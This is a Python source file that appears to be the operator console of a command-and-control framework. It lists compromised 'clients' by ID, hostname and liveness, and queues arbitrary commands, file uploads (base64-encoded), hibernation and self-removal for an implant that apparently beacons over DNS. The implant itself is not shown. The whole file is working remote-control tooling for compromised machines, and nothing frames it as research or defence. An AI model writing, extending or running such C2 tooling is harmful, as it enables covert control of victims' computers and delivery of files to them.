# console.py
import json
import time
import base64
from os import path

import settings

def newConsole():
    #consoleGetID()

    print("Type help or ? for command options: ")
    while True:
        with open('./manage.json') as f:
            manage = json.load(f)

        consoleInput = input(str(manage["currID"]) + " > ")

        options = {
            "?": consoleHelp,
            "help": consoleHelp,
            "setID": consoleSetID,
            "getID": consoleGetID,
            "send": consoleSend,
            "dissolve": consoleDissolve,
            "hibernate": consoleHibernate,
            "file": consoleFile
        }

        
        if consoleInput == '':
            continue
        if consoleInput not in options:
            print("Not an Option. Try again")
        else:
            options[consoleInput](manage)


def consoleHelp(manage):
    print("\nHelp Menu\n_________\n"
            "? or help\t\tdisplay help\n"
            "setID\t\t\tset the ID to interact with\n"
            "getID\t\t\tget a list of stored IDs\n"
            "send\t\t\tsend a command to the active id\n"
            "dissolve\t\tremove client on a host\n"
            "hibernate\t\tsend the client into hibernation (stop sending dns requests)")

# set the id to interact with
def consoleSetID(manage):
    newID = input("Which ID?: ")

    with settings.lock:
        f = open('./manage.json', 'r')
        manage = json.load(f)
        f.close()        
        
        if newID in manage["clients"]:
            manage["currID"] = newID
            
            f = open('./manage.json', 'w')
            json.dump(manage, f)
            f.close()
        else:
            print("Not a valid ID")

# print the current client connections stored
def consoleGetID(manage):
    print("\nID\t\tHostname\t\tState")
    print("____\t\t________________\t_____")
    for x in manage["clients"]:
        if (time.time() - manage["clients"][x]["lastactive"]) < settings.ttl:
            state = "alive"
        else:
            state = "dead"
        print(x + "\t\t" + manage["clients"][x]["hostname"] + "\t\t" + state)
    print('')

# if ID is still valid, get a command from user and set to next command for client
def consoleSend(manage):
    command = input("Ready for command: ")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        if manage["currID"] in manage["clients"]:
            
            manage["clients"][manage["currID"]]["command"] = command
            
            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
        else:
            print("Need to set a valid ID first")

def consoleDissolve(manage):
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        if manage["currID"] in manage["clients"]:
            
            manage["clients"][manage["currID"]]["command"] = "dissolve"

            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
            print(manage["currID"] + " Dissolved!")
        else:
            print("Need to set a valid ID first")
        

def consoleHibernate(manage):
    hibLength = input("For how long in minutes (Cannot exceed 35,750): ")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        if manage["currID"] in manage["clients"]:
            
            manage["clients"][manage["currID"]]["command"] = "hibernate"
            manage["clients"][manage["currID"]]["arg"] = str(hibLength)
            
            with open('./manage.json', 'w') as f:
                json.dump(manage, f)
        else:
            print("Need to set a valid ID first")

        

def consoleFile(manage):
    if manage["currID"] not in manage["clients"]:
        print("Need to set a valid ID first")
        return

    filename = input("What is the filename: ")
    
    if not path.exists(filename):
        print("File does not exist")
        return

    with open(filename, 'rb') as f:
        data = f.read()

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        manage["clients"][manage["currID"]]["file"]["name"] = filename
        manage["clients"][manage["currID"]]["file"]["data"] = base64.b64encode(data).decode()
        manage["clients"][manage["currID"]]["command"] = "file"

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    